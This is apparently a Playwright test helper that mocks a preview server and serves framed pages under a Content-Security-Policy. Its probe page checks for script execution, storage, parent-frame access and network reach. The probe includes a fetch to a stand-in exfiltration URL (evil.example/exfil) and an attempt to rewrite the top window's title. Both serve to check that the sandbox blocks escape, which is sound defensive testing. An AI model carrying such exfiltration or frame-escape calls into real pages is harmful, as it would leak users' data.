import type { Page } from "@playwright/test";
import { designBridge } from "./data";

// The preview door as the test serves it: the address a previewed page comes from,
// with the policy and the bridge the real door sends. The real one is
// harness/interface/server/preview_door.py, pinned by tests/test_preview_door.py; this copy
// gives the app's side (the frames, the address line, the "internet?" question) a page that
// behaves like a served one.

const DOOR = "http://127.0.0.1:59123";
const APP = "frame-ancestors http://localhost:* http://127.0.0.1:*";

/** The door's own script, which tells the app where the page is and what its policy refused, and
 *  takes Back and Reload from it; then the design bridge (point, pin, retype), read
 *  from the real door's source so the two never differ. */
const BRIDGE =
  "<script>(function(){if(window.top===window)return;" +
  "var say=function(m){m.reevePreview=1;try{window.top.postMessage(m,'*');}catch(e){}};" +
  "var here=function(){say({type:'page',path:location.pathname+location.search+location.hash,title:document.title});};" +
  "here();window.addEventListener('load',here);" +
  "document.addEventListener('securitypolicyviolation',function(e){say({type:'blocked',url:String(e.blockedURI||''),what:String(e.effectiveDirective||'')});});" +
  "window.addEventListener('message',function(e){var d=e.data||{};if(d.reevePreviewDo==='back')history.back();else if(d.reevePreviewDo==='reload')location.reload();});" +
  "})();</script>";
let bridgeHtml: string | undefined;
const bridge = () => (bridgeHtml ??= BRIDGE + designBridge());

/** A served page: the bridge in its head, then `head` and `body`. */
const served = (title: string, body: string, head = "") =>
  `<!doctype html><html><head>${bridge()}${head}<title>${title}</title></head><body>${body}</body></html>`;

/** The security review, a page that tests the frame it is in: whether its script runs, its
 *  stylesheet loads and its storage keeps, and whether the parent window and the network can be
 *  reached. Two levers are declared on it: a colour and an attribute. */
function securityReview() {
  const levers = {
    accent: { label: "Accent", css: "--accent", options: ["#74358c", "#0d6a8a"] },
    density: { label: "Density", attr: "data-density", options: ["roomy", "compact"] },
  };
  const probe = [
    'var probe = document.getElementById("probe");',
    'var say = function (t) { probe.textContent += " · " + t; };',
    'probe.textContent = "script ran";',
    'say(getComputedStyle(document.body).marginTop === "37px" ? "stylesheet loaded" : "stylesheet missing");',
    'try { localStorage.setItem("k", "v"); say(localStorage.getItem("k") === "v" ? "storage kept" : "storage lost"); } catch (e) { say("storage refused"); }',
    "try { void window.parent.document.title; window.top.document.title = 'ESCAPED'; say('parent reached'); } catch (e) { say('parent blocked'); }",
    'fetch("https://evil.example/exfil").then(function () { say("network reached"); }, function () { say("network blocked"); });',
  ].map((line) => `  ${line}`);
  return (
    `<!doctype html><html><head>${bridge()}<meta charset="utf-8"><title>Security review</title><link rel="stylesheet" href="review.css"></head><body>\n` +
    [
      "<h1>Security review</h1>",
      `<div id="probe">script did not run</div>`,
      '<a id="next" href="details.html">Details</a>',
      "<style>:root{--accent:#74358c} h1{color:var(--accent)}</style>",
      `<script type="application/json" id="reeve-tweaks">${JSON.stringify(levers)}</script>`,
      `<script>\n${probe.join("\n")}\n</script></body></html>`,
    ].join("\n")
  );
}

/** Serve the door's pages, and answer the one site off the web a page tries to reach, so what
 *  "reached" means is the policy's doing and nothing leaves the machine. Returns the door's address. */
export async function routeDoor(page: Page): Promise<string> {
  const review = securityReview();
  const details = (back: string) => served("Details", `<h1>Details</h1><a id="home" href="${back}">Back to the review</a>`);
  const heading = (title: string, h1: string) => served(title, `<h1>${h1}</h1>`);
  const pages: Record<string, string> = {
    "reports/security-review.html": review,
    "reports/details.html": details("security-review.html"),
    "reports/review.css": "body{margin-top:37px}",
    "reports/plan.html": heading("Plan", "Plan"),
    "reports/plan.a.html": heading("A", "Cards"),
    "reports/plan.b.html": heading("B", "Table"),
    // The same pages under design/: the design tools live in a design's own tab, not in Files
    // (owner, 2026-10-20), so their tests open these. Pricing has two variants.
    "design/review.html": review,
    "design/details.html": details("review.html"),
    "design/review.css": "body{margin-top:37px}",
    "design/pricing.html": served("Pricing", '<h1>Plans</h1><p class="note">Start free.</p>'),
    "design/pricing.a.html": heading("A", "Cards"),
    "design/pricing.b.html": heading("B", "Table"),
  };
  await page.route(`${DOOR}/**`, (route) => {
    const [, , key, ...rest] = new URL(route.request().url()).pathname.split("/");
    const path = rest.join("/");
    const body = pages[decodeURIComponent(path)];
    if (body === undefined) return route.fulfill({ status: 404, contentType: "text/plain", body: "Not found" });
    // An "open" key lets the page reach the internet; any other keeps it to the door.
    const policy = key === "open"
      ? APP
      : `default-src ${DOOR} 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src ${DOOR}; form-action ${DOOR}; frame-src ${DOOR}; base-uri ${DOOR}; object-src 'none'; ${APP}`;
    return route.fulfill({
      contentType: path.endsWith(".css") ? "text/css" : "text/html",
      headers: { "Content-Security-Policy": policy, "Cache-Control": "no-store" },
      body,
    });
  });
  await page.route("https://evil.example/**", (route) =>
    route.fulfill({ status: 200, contentType: "text/plain", headers: { "Access-Control-Allow-Origin": "*" }, body: "ok" }),
  );
  return DOOR;
}
